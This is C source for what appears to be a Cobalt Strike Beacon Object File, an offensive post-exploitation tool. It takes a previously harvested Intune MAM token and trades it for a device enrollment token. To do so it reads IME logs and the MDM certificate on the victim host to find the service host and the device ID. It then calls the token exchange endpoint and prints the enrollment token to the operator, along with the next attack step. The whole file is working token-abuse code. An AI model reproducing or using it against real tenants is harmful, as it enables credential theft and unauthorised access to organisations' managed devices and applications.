/*
 * exchange BOF-PE - Intune MAM-to-enrollment token exchange
 *
 * Auto-discovers the IWService host from IME logs and the device ID from
 * the MDM enrollment certificate, then exchanges a MAM token for an
 * enrollment token via the TokenRenewalService endpoint.
 *
 * Entry point: void go(const char *data, int len)
 *   arg0 (string) : MAM token (from askwam BOF)
 *   arg1 (string) : host override (optional, empty = auto-discover)
 */

#include "beacon.h"
#include "bofdefs_pe.h"
#include "intune_discovery.h"
#include "intune_http.h"

#define MAX_URL 4096

/* ----------------------------------------------------------------
 * JSON helpers: extract "Token" value from {"Result":{"Token":"..."}}
 * ---------------------------------------------------------------- */

static char *extract_token(const char *json)
{
    const char *key = "\"Token\"";
    const char *p = bof_strstr(json, key);
    if (!p)
        return NULL;

    p += bof_strlen(key);
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' || *p == ':')
        p++;
    if (*p != '"')
        return NULL;
    p++;

    const char *start = p;
    while (*p && *p != '"') {
        if (*p == '\\')
            p++;
        p++;
    }

    int len = (int)(p - start);
    if (len <= 0)
        return NULL;

    char *out = (char *)bof_malloc(len + 1);
    if (!out)
        return NULL;
    bof_memcpy(out, start, len);
    out[len] = '\0';
    return out;
}

/* ----------------------------------------------------------------
 * Entry point
 * ---------------------------------------------------------------- */

__declspec(dllexport) void go(const char *data, int len)
{
    BEACON_INIT;

    datap parser;
    BeaconDataParse(&parser, (char *)data, len);
    char *mam_token = BeaconDataExtract(&parser, NULL);
    char *host_override = BeaconDataExtract(&parser, NULL);

    if (!mam_token || bof_strlen(mam_token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No MAM token provided\n");
        return;
    }

    char host[256] = {0};
    char fef_host[256] = {0};
    if (host_override && bof_strlen(host_override) > 0) {
        bof_strncpy(host, host_override, 255);
        host[255] = '\0';
        bof_strncpy(fef_host, host, 255);
    } else {
        if (discover_host(host, sizeof(host), "fef.")) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Discovered host: %s\n", host);
            bof_strncpy(fef_host, host, 255);
        } else if (discover_host(host, sizeof(host), NULL)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Found regional host: %s\n", host);
            if (derive_fef_host(host, fef_host, sizeof(fef_host)))
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] Derived IWService host: %s\n", fef_host);
            else
                bof_strncpy(fef_host, host, 255);
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Could not discover host from IME logs\n");
            return;
        }
    }

    char device_id[128] = {0};
    if (!discover_device_id(device_id, sizeof(device_id)))
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Device ID discovery failed (intune-apps will also fail)\n");

    char url[MAX_URL];
    bof_snprintf(url, MAX_URL,
        "https://%s/OAuth/StatelessOAuthService/OAuthProxy/?api-version=1.0",
        host);
    url[MAX_URL - 1] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[*] GET %s\n", url);

    int status = 0;
    char *resp = http_request("GET", url, mam_token, NULL, 0, NULL, &status);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] HTTP request failed (WinHTTP err=%lu)\n", bof_GetLastError());
        return;
    }

    if (status != 200) {
        int show = (int)bof_strlen(resp);
        if (show > 300) show = 300;
        BeaconPrintf(CALLBACK_ERROR, "[-] HTTP %d: %.*s\n", status, show, resp);
        bof_free(resp);
        return;
    }

    char *token = extract_token(resp);
    bof_free(resp);

    if (!token || bof_strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No token found in response\n");
        if (token)
            bof_free(token);
        return;
    }

    char iwurl[MAX_URL];
    bof_snprintf(iwurl, MAX_URL,
        "https://%s/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService",
        fef_host);
    iwurl[MAX_URL - 1] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Enrollment token (%d chars):\n%s\n\n"
        "[*] IWService URL: %s\n"
        "[*] Device ID: %s\n\n"
        "[*] Next: intune-apps <token> list\n",
        (int)bof_strlen(token), token,
        iwurl, device_id);
    bof_free(token);
}

BEACON_MAIN("zz", go)
